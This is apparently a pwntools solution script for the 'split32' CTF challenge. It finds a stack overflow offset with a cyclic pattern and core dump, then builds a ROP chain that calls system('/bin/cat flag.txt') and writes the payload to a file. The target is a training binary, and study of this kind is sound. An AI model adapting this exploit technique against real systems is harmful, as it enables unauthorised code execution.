import pwn

path = "./split32"
pwn.context.binary = pwn.ELF(path)
pwn.context.log_level = 'warning'

pwn.warning("Starting test process to find buffer size...")
process = pwn.process(path)
de_bruijn = pwn.cyclic(128)
process.sendline(de_bruijn)
process.wait()
core = process.corefile
stack = core.esp # rsp (x64) / esp (x86)
offset = de_bruijn.find(core.read(stack, 4)) - 4 # -4 on x86 ONLY
pwn.warning(f"Found pattern at offset {offset}")

pwn.warning("Crafting payload...")
elf = pwn.ELF(path)
rop = pwn.ROP(elf)
rop.call(elf.plt['system'], [next(elf.search(b"/bin/cat flag.txt"))])
payload = pwn.flat({offset: rop.chain()})

pwn.warning(f"Writing crafted payload ({len(payload)} bytes) in payload.txt...")
with open("payload.txt", "wb+") as fd:
    fd.write(payload)

pwn.warning("Starting final process for exploitation...")
process = pwn.process(path)
pwn.atexit.register(process.clean_and_log)
process.sendline(payload)
pwn.warning(process.recvallS())
